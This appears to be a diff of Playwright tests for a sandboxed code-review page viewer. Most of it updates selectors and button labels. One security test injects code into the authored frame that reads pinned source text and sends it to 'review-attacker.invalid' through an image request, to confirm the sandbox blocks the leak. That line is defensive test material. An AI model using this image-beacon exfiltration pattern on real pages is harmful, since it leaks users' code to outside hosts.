@@ -9,12 +9,12 @@ test("HTML pages discover dynamic pinned slots, preserve JS state and submit hos
     .frameLocator("iframe");
   await expect(frame.locator("h1")).toHaveText("Trim then convert");
   await expect(
-    frame.locator('refact-slot[data-block="code"] pre'),
+    frame.locator('refact-slot[data-block="code"] .rf-insert-body'),
   ).toContainText("Number(p.trim())");
   await frame.locator("#counter").click();
   await frame.locator("#dynamic").click();
   await expect(
-    frame.locator('refact-slot[data-block="diff"] pre'),
+    frame.locator('refact-slot[data-block="diff"] .rf-insert-body'),
   ).toContainText("@@");
   await frame.locator("#invalid").click();
   await expect(page.getByRole("dialog")).toHaveCount(0);
@@ -45,7 +45,7 @@ test("HTML pages discover dynamic pinned slots, preserve JS state and submit hos
   await expect(frame.locator("#counter")).toHaveText("1");
   await frame
     .locator('refact-slot[data-block="code"]')
-    .getByRole("button", { name: "Reveal", exact: true })
+    .getByRole("button", { name: "Open", exact: true })
     .click();
   await expect(
     page.getByRole("dialog").locator(".cm-editor").first(),
@@ -94,7 +94,7 @@ test("opaque frame accepts only registered IDs and flags duplicate slots", async
     .frameLocator('iframe[title="Input trimming"]')
     .frameLocator("iframe");
   await expect(
-    frame.locator('refact-slot[data-block="code"] pre'),
+    frame.locator('refact-slot[data-block="code"] .rf-insert-body'),
   ).toContainText("Number(p.trim())");
   const src = await iframe.getAttribute("srcdoc");
   const channel = /var channel\s*=\s*("[^"]+")/.exec(src ?? "")?.[1];
@@ -140,7 +140,7 @@ test("host-fed source bytes remain inert DOM text", async ({ page }) => {
     .frameLocator('iframe[title="Input trimming"]')
     .frameLocator("iframe");
   await expect(
-    frame.locator('refact-slot[data-block="code"] pre'),
+    frame.locator('refact-slot[data-block="code"] .rf-insert-body'),
   ).toContainText("Number(p.trim())");
   const src = await iframe.getAttribute("srcdoc");
   const channel = JSON.parse(
@@ -187,8 +187,12 @@ test("applying a different page version creates a fresh context, host refresh al
     .frameLocator("iframe");
   await expect(next.locator("#counter")).toHaveText("0");
   await expect(
-    next.locator('refact-slot[data-block="code"] pre'),
+    next.locator('refact-slot[data-block="code"] .rf-insert-body'),
   ).toContainText("Number(p.trim())");
+  await page
+    .getByRole("navigation", { name: "Tour pages" })
+    .getByRole("button", { name: "Loop bound fix" })
+    .click();
   await expect(
     page
       .frameLocator('iframe[title="Loop bound fix"]')
@@ -210,7 +214,7 @@ test("authored self-navigation cannot exfiltrate pinned source outside trusted w
     .frameLocator('iframe[title="Input trimming"]')
     .frameLocator("iframe");
   await expect(
-    frame.locator('refact-slot[data-block="code"] pre'),
+    frame.locator('refact-slot[data-block="code"] .rf-insert-body'),
   ).toContainText("Number(p.trim())");
   const inner = page
     .frames()
@@ -220,7 +224,8 @@ test("authored self-navigation cannot exfiltrate pinned source outside trusted w
   expect(inner).toBeDefined();
   if (!inner) throw new Error("Authored frame missing");
   await inner.evaluate(async () => {
-    const source = document.querySelector("refact-slot pre")?.textContent ?? "";
+    const source =
+      document.querySelector("refact-slot .rf-insert-body")?.textContent ?? "";
     const image = document.createElement("img");
     image.src =
       "https://review-attacker.invalid/image?source=" +
